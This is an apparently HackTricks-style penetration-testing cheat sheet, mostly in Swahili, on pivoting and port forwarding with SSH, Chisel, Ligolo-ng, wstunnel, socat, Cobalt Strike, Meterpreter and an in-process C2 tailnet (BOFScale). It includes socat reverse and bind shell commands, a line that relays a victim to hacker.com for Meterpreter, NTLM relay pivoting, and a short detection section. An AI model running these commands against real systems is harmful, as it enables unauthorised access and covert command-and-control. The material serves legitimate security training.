# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Dokezo la Nmap

> [!WARNING]
> Usaidizi wa Nmap kwa proxy una mipaka kwa miunganisho ya TCP na hauathiri uchanganuzi wa ping, port, au utambuzi wa OS. Scanner ikiwa nyuma ya SOCKS proxy, **zima ugunduzi wa host** (`-Pn`) na utumie **uchanganuzi wa TCP connect** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Amri ya mwisho hutumia chaguo za `-u` na `-i` za Evil-WinRM kutambua akaunti na host ya WinRM; port chaguomsingi ya WinRM ni 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH inaweza kuelekeza miunganisho ya X11, milango ya TCP ya aina yoyote, na soketi za Unix-domain kupitia njia yake iliyosimbwa.<sup>[[6]](#references)</sup>

Muunganisho wa picha wa SSH (X)

`-Y` huwasha uelekezaji wa X11 unaoaminika na `-C` huomba data inayopitishwa ibanwe.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Fungua Port mpya kwenye SSH Server --> Port nyingine

Uelekezaji wa `-R` husikiliza kwenye SSH server na kuunganisha upande wa ndani; anwani ya bind iliyobainishwa hudhibiti ni violesura vipi vinavyoweza kufikia msikilizaji huyo.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Port ya ndani --> Host iliyodhibitiwa (SSH) --> Third_box:Port

Uelekezaji wa Local (`-L`) husikiliza kwenye client na huunganisha kwenye destination kutoka upande wa SSH server.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Lango la ndani --> Host iliyodukuliwa (SSH) --> Popote

Uelekezaji wa Dynamic (`-D`) huunda listener ya ndani ya SOCKS4/SOCKS5, ambayo miunganisho yake huanzishwa kutoka upande wa mbali.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop with ProxyJump

`-J`/`ProxyJump` huunganisha kwenye lengwa kupitia jump host moja au zaidi zilizotenganishwa kwa koma. Chaguo za forwarding bado ni za muunganisho wa mwisho wa SSH, kwa hivyo SOCKS listener hapa chini hufungua destinations kutoka `internal-target`, si kutoka bastion ya kwanza. Hii huepusha kuingia kwenye jump host na kuanzisha SSH client ya pili hapo.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Chaguo mahususi kwa host za jump machines zinapaswa kuwekwa kwenye `~/.ssh/config`; usanidi wa mstari wa amri uliokusudiwa kwa destination hautumiki kiotomatiki kwa host za kati.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Hii ni muhimu kupata reverse shells kutoka kwa host za ndani kupitia DMZ hadi kwa host yako:

Mpangilio wa `GatewayPorts` wa server hudhibiti ikiwa remote forward inaweza kufungamana na anwani isiyo ya loopback; thamani yake ya chaguomsingi ni `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Mfano huu unaohitaji root huunda vifaa vya tunnel kwenye host zote mbili. Server lazima iruhusu tun forwarding, na akaunti iliyochaguliwa lazima iwe na ufikiaji wa kifaa cha tun; `PermitRootLogin yes` ni njia mojawapo ya kutumia akaunti ya `root` hapa.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Washa forwarding upande wa seva.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Weka route mpya upande wa client.

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Usalama – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 iliongeza kiendelezi cha strict-KEX ili kukabiliana na shambulio la Terrapin dhidi ya uadilifu wa data katika hatua ya awali ya usafirishaji. Sasisha pande zote mbili inapowezekana, na ufuate mwongozo wa vendor kwa matoleo ya zamani badala ya kudhani kuwa channel iliyoforwardiwa inalindwa kwa kutegemea toleo pekee.<sup>[[8]](#references)</sup>

## SSHUTTLE

Unaweza kutengeneza **tunnel** kupitia **ssh** ili kupitisha **traffic** yote inayoelekezwa kwenye **mtandao mdogo** kupitia host.\
Kwa mfano, kuforward traffic yote inayoelekezwa kwenye 10.10.10.0/24

`sshuttle` hutoa proxying ya uwazi kupitia SSH na huruhusu kuchagua subnets na amri maalum ya SSH kama inavyoonyeshwa hapa chini.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Unganisha kwa kutumia ufunguo wa faragha

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` ya Metasploit inasaidia uelekezaji wa bandari wa ndani na wa mbali, huku moduli yake ya SOCKS proxy ikiwa imekusudiwa kufanya kazi na routes za session au `autoroute`, na katika mifano hii husikiliza kwenye port 1080 kwa chaguomsingi.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Bandari ya ndani --> Host iliyoathiriwa (session inayotumika) --> Third_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Njia nyingine:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon ya Cobalt Strike inaweza kuelekeza miunganisho ya SOCKS4a/SOCKS5 kupitia Beacon; `rportfwd` hufunga port kwenye host iliyoathiriwa, huku `rportfwd_local` ikianzisha muunganisho wa kwenda lengoni kutoka kwa mteja wa Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Fungua port kwenye Team Server kwenye interfaces zinazopaswa kuelekeza trafiki kupitia Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Katika hali hii, **port inafunguliwa kwenye Beacon host**, si kwenye Team Server, na traffic inatumwa kwa Team Server na kutoka hapo kwenda kwenye host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Mwongozo wa reverse-forwarding unaeleza tabia ifuatayo:<sup>[[14]](#references)</sup>

- Reverse port forward ya Beacon imeundwa **ku-tunnel traffic hadi kwenye Team Server, si ku-relay traffic kati ya mashine binafsi**.
- Traffic **hu-tunnel ndani ya traffic ya C2 ya Beacon**, ikijumuisha viungo vya P2P.
- Port za juu kwa kawaida huepusha vizuizi vya privileged-port, lakini sera ya target OS na listeners zilizopo bado hutumika.

### rPort2Port local

> [!WARNING]
> Katika hali hii, **port hufunguliwa kwenye host ya Beacon**, si kwenye Team Server, na **traffic hutumwa kwa client ya Cobalt Strike** (si kwa Team Server), kisha kutoka hapo hutumwa kwa host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Tailcat: uelekezaji wa TCP wa userspace bila akaunti

Tailcat hutumia data plane ya Tailscale ya WireGuard/NAT-traversal/DERP bila control plane ya Tailscale. Haihitaji akaunti ya Tailscale wala ruhusa za msimamizi, na haisakinishi host routes wala kubadilisha DNS. Tofauti na [Tailscale Serve/Funnel](reverse-shells/expose-local-to-the-internet.md#tailscale-funnel--serve) au [BOFScale tailnet](#bofscale---cdn-fronted-in-process-tailnet) inayofanya kazi ndani ya mchakato, seva hushiriki *tailcat address* nje ya njia ya kawaida. Mteja hutumia address hiyo kufikia port inayotolewa na node ya mbali.<sup>[[62]](#references)</sup>

Kwa huduma ya TCP ambayo tayari inasikiliza kwenye port `4444` ya node ya mbali, anzisha `serve` hapo na upe anwani inayochapishwa kwa `forward` kwenye mteja. Kwa chaguomsingi, amri ya pili hufunga kwenye `127.0.0.1:18080`, kwa hiyo mchakato wa ndani unaotumia soketi za kawaida za TCP pekee unaweza kuunganishwa na port hiyo ya loopback huku Tailcat ikipeleka trafiki yake kwenye port `4444` ya mbali.<sup>[[62]](#references)</sup> Nambari za port si maalum kwa Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Anwani hiyo ina public key ya WireGuard ya seva na, kwa chaguomsingi katika matoleo ya sasa, pre-shared key. Ichukulie kama credential: seva isiyo na vizuizi hukubali peer anayejua anwani hiyo. Anwani ya muda huacha kufanya kazi seva inapoondoka. Key ya `default` iliyohifadhiwa hufanya `serve` ya kawaida itumie tena anwani ileile katika utekelezaji unaofuata, kwa hiyo kagua ujumbe wa uanzishaji na uweke vizuizi kwa clients kwa kutumia `serve --allow` ikiwa anwani inaweza kufichuka.<sup>[[62]](#references)</sup>

Miunganisho inaweza kutumia njia ya moja kwa moja ya UDP au relay ya DERP. Hii huepusha hitaji la domain maalum ya C2 lakini haifanyi shughuli za mtandao kutoweka.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet ya ndani ya mchakato inayopitia CDN

[BOFScale](https://github.com/NetSPI/BOFscale) huendesha overlay ya Tailscale iliyorekebishwa ndani ya implant ya Windows C2 bila kusakinisha TUN driver au service. Ina vipengele vitatu: `tailscaled` BOF-PE ya `c-shared` ya CGo isiyosawazisha, BOF-PE ndogo ya C++ inayowasiliana na local API, na daraja la TCP-to-SOCKS5 la `socksportfwd` lisilosawazisha.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 na DERP zinazooana na CDN

Kwa kawaida Tailscale hutumia HTTP upgrades za umiliki kwa control channel ya TS2021 inayotumia Noise na relay ya DERP. BOFScale huhifadhi byte streams hizo lakini huzisafirisha kwa WebSockets za RFC 6455, ikitumia `Sec-WebSocket-Protocol: ts2021` au `derp`, ili origin ya Headscale/DERP inayodhibitiwa na operator iweze kuwa nyuma ya CDN inayokubali WebSocket upgrades za kawaida pekee. Client iliyorekebishwa hujaribu tena TS2021 kupitia WebSockets baada ya HTTP `500`, hujaribu tena DERP baada ya HTTP `426`, na hufanya DERP WebSocket dialer itumie usanidi wa host proxy; BOF huweka `TS_DEBUG_DERP_WS_CLIENT=1` ili kuruka jaribio la kwanza linalojulikana kushindwa.<sup>[[53]](#references)[[54]](#references)</sup>

CDN na origin proxy lazima zihifadhi WebSocket upgrades za `/ts2021` na `/derp`, zisambaze `/key` kama HTTP ya kawaida, na zizime read/write timeouts za ndani kwa sababu relay sessions zinaweza kubaki wazi bila kikomo. Usanidi wa Headscale uliotolewa huwasha `verify_clients`, huchapisha DERP map iliyopachikwa ya operator pekee, na huacha `derp.urls` ikiwa tupu ili kuzuia fallback kwa relays zinazoendeshwa na Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon ya ndani ya mchakato na udhibiti wa named-pipe

Isipobadilishwa, entry point ya BOF huwasha `tailscaled` kwa kutumia `-tun=userspace-networking`, `-state mem:`, na `-no-logs-no-support`, kisha huunda pipe yenye jina la UUID. Huelekeza Go stdout/stderr kupitia OS pipe hadi Beacon output API, kwa hiyo daemon nzima na Go runtime hubaki kwenye memory lakini state na logs haziandikwi kwenye Tailscale directory.<sup>[[53]](#references)[[54]](#references)</sup>

Client nyepesi huiga local API ya Tailscale ya HTTP/1.0 kupitia pipe hiyo. Hufungua pipe kwa `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` kwa sababu safu ya `safesocket` ya daemon huiga utambulisho wa pipe client, hutuma `Tailscale-Cap: 125`, na kuunganisha local API na operesheni za `up`, `down`, `status`, kutangaza route, na kuzima.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Usiondoe Go BOF-PE iliyomapishwa kwa mkono baada ya kuiomba daemon izime: runtime na garbage-collector goroutines zinaweza kuendelea kutekelezwa kutoka memory ambayo loader imeondoa ramani yake. Endesha `tailscaled` katika process ya kutupwa na uimalize process hiyo ili kufanya usafishaji wa mwisho.<sup>[[54]](#references)</sup>

### Elekeza trafiki inayoanzishwa na host kupitia userspace SOCKS5

Miunganisho inayoingia ya tailnet na subnet routes zilizotangazwa hufanya kazi ndani ya userspace network stack, lakini processes za kawaida kwenye host iliyoathiriwa hazina OS route inayoingia kwenye overlay. Kwa hiyo `socksportfwd` husikiliza kwenye TCP port inayoelekea kwa victim, hujadiliana na listener ya `0.0.0.0:1080` ya daemon kwa SOCKS5 `NO AUTH`, hutuma `CONNECT` kwa destination ya tailnet, na kupeleka data kuelekea pande zote mbili bila kusawazisha. Target ikiwa jina la MagicDNS, hutumia `ATYP_DOMAIN`, hivyo `tailscaled` hutatua jina hilo bila kulifichua kwa Windows resolver.<sup>[[53]](#references)[[54]](#references)</sup>

Mtiririko wa chini kabisa wa operator umeonyeshwa hapa chini; node ya operator na implant lazima zitumie binaries zilizorekebishwa kwa sababu Tailscale ya kawaida haiwezi kutumia muundo huu wa CDN.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Usambazaji wa ndani unaweza kutenganisha msikilizaji wa uthibitishaji unaoonekana na zana ya relay: lazimisha mashine kuthibitisha utambulisho wake kwenye port iliyofungwa ya host iliyoathiriwa, pitisha muunganisho kupitia tailnet hadi `ntlmrelayx`, kisha upeleke relay kwenye AD CS, LDAP, HTTP, SMB, au target nyingine inayooana. Tazama [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) na [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) kwa hatua mahususi za udhaifu; BOFScale ni ya usafirishaji pekee.<sup>[[54]](#references)</sup>

### Ugunduzi

Tafuta mchanganyiko wa viashiria badala ya kiashiria kimoja dhaifu: runtime ya Go katika mchakato ambao kwa kawaida hautumii Go, pipe ya UUID yenye SDDL ruhusu `D:(A;;GA;;;WD)`, msikilizaji wa SOCKS usiotarajiwa kwenye `0.0.0.0:1080`, na miunganisho ya TLS WebSocket ya muda mrefu kwenda kwenye anwani za CDN. Kwa ukaguzi wa TLS, weka alama kwa `Sec-WebSocket-Protocol: derp` au `ts2021` ikiwa mchakato unaomiliki si huduma iliyoidhinishwa ya `tailscaled`. Kanuni za `bofscale.yar` za repository hutoa saini za kumbukumbu za vipengele vyote vitatu vya BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Mradi huu hutoa endpoint za web tunnel kama vile `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, na `tunnel.php`; pakia endpoint inayoungwa mkono kabla ya kuanzisha proxy ya ndani.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Unaweza kuipakua kwenye ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel husafirisha trafiki ya TCP/UDP kupitia HTTP kwa kutumia muunganisho unaolindwa na SSH; tumia builds zinazooana za client/server na uthibitishe syntax ya amri ya release uliyochagua.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) husafirisha forwards tuli au zinazobadilika kupitia WebSocket, HTTP/2, au WebTransport (HTTP/3 kupitia QUIC). Builds za sasa zinaunga mkono TCP, UDP, Unix sockets, stdio, SOCKS5, HTTP proxying, na listeners za Linux transparent-proxy katika modi za forward na reverse.<sup>[[52]](#references)</sup>

### Pivot ya SOCKS5 ya reverse

Endesha server kwenye attacker na ufanye pivot iunganishe kwa kutoka kwa kutumia `-R`. Katika mwelekeo huu, listener ya SOCKS5 huundwa kwenye **server**, huku miunganisho inayoombwa ikitoka kwenye mtandao wa **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward hutumia mwelekeo huohuo. Kwa mfano, ifuatayo hufichua `10.10.10.20:445`, kama inavyofikiwa na pivot, kwenye loopback port `8445` ya mshambuliaji:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Maelezo ya Egress na usafirishaji

- Ongeza `-p http://user:pass@proxy:8080` kwa client ili kupita kwenye HTTP proxy iliyowekwa wazi. Tumia `socks5h://127.0.0.1:1080` kwenye clients kama `curl` (au washa proxied DNS kwenye application) ili majina ya ndani yatatuliwe upande wa pili wa tunnel badala ya kuvuja kwa local resolver.<sup>[[52]](#references)</sup>
- `wss://` huchagua WebSocket iliyolindwa kwa TLS. Client ya `https://` huchagua HTTP/2, lakini buffering au ubadilishaji wa HTTP/1 unaofanywa na reverse proxies/CDNs mara nyingi huvuruga mkondo wa pande mbili; unapojaribu hali hii, weka seva ya wstunnel wazi moja kwa moja.<sup>[[52]](#references)</sup>
- `wts://` huchagua WebTransport kupitia QUIC. Anzisha seva kwa `--enable-webtransport` (au URL ya kusikiliza ya `wts://`) na uruhusu UDP kwenye port ya kusikiliza. Hali hii haiwezi kupita kwenye HTTP `CONNECT` proxy ya kawaida kwa sababu proxy hiyo husafirisha TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Mradi wa upstream unaonya usichukulie certificate yake ya self-signed iliyojumuishwa kuwa kinga ya faragha. Pendelea certificate halali ya custom pamoja na `--tls-verify-certificate` (au mTLS), weka proxy listeners kwenye loopback isipokuwa ufikiaji wa mbali umekusudiwa, na tunnel protocols ambazo tayari ni salama pale usiri unapohitajika.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Mwongozo wa kuanza haraka wa Ligolo-ng unaeleza interface ya TUN kwenye proxy, uthibitishaji wa fingerprint ya certificate kwa agent, na usanidi wa route kwa mtandao unaopitishwa kwenye tunnel.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Kufunga na Kusikiliza kwa Agent

Ligolo-ng inaweza kuongeza listeners kwenye agent wanaosambaza trafiki kwenda kwenye anwani ya upande wa proxy, na masafa yake yaliyohifadhiwa ya `240.0.0.0/4` yanaweza kuelekezwa ili kufikia huduma za ndani za agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Kufikia Ports za Ndani za Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot huanzisha reverse tunnel kutoka kwa victim na kufichua SOCKS4 proxy kwenye loopback address ya mshambuliaji; README yake pia inaeleza credentials za NTLM-proxy na chaguo za hash.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot kupitia **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat huunganisha aina za anwani kama `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, na `PROXY`; mifano iliyo hapa chini inachanganya endpoints hizo zilizoandikwa.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port kupitia socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter kupitia SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Unaweza kupita kupitia **proxy isiyo na uthibitishaji** kwa kutumia aina ya anwani ya `PROXY` iliyoandikwa kwenye nyaraka za socat, kwa kutekeleza mstari huu badala ya wa mwisho kwenye console ya victim.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel ya SSL Socat

**/bin/sh console**

Tengeneza vyeti pande zote mbili: mteja na seva

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Unganisha port ya SSH ya ndani (22) na port 443 ya host ya mshambuliaji.

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink ni zana ya muunganisho ya mstari wa amri ya PuTTY, yenye chaguo za SSH forwarding zinazofanana na `ssh`.<sup>[[22]](#references)</sup>

Tumia `-P` herufi kubwa kwa port ya SSH. `-pw` imehifadhiwa kwa ajili ya uoanifu, lakini huonyesha password kwenye orodha ya michakato; ikiwezekana, pendelea uthibitishaji kwa key au `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

Kwa kuwa binary hii itaendeshwa kwenye mashine ya mwathiriwa na ni SSH client, fungua huduma na port ya SSH kwa ajili ya muunganisho wa kurudi; mfano ufuatao unatumia `-R` kuelekeza port inayoweza kufikiwa ndani ya nchi kwenda kwenye mashine ya mshambuliaji.<sup>[[22]](#references)</sup>

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## Windows netsh

### Port2Port

Tumia muktadha wenye ruhusa zinazohitajika na host unapounda au kubadilisha sheria za kudumu za `portproxy`. Microsoft imeandika miundo ya kuongeza, kuonyesha na kufuta `v4tov4` inayotumika hapa chini.<sup>[[24]](#references)</sup>

```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```

### Kuweka `portproxy` kupitia kazi iliyoratibiwa

Wakati vitambulisho vya msimamizi vinapatikana, utekelezaji wa mbali wa Task Scheduler unaweza kusakinisha sheria asilia ya kuelekeza muunganisho bila kupakia relay maalumu. Kwa mfano, [Impacket `atexec`](../windows-hardening/lateral-movement/atexec.md) inaweza kufanya pivot isikilize kwenye TCP/443 na kuelekeza muunganisho kwenye huduma ya ndani ya SMB.<sup>[[57]](#references)[[58]](#references)</sup>

```bash
atexec.py 'DOMAIN/USER:PASSWORD'@<PIVOT> \
  'netsh interface portproxy add v4tov4 listenport=443 connectaddress=10.0.12.101 connectport=445'
```

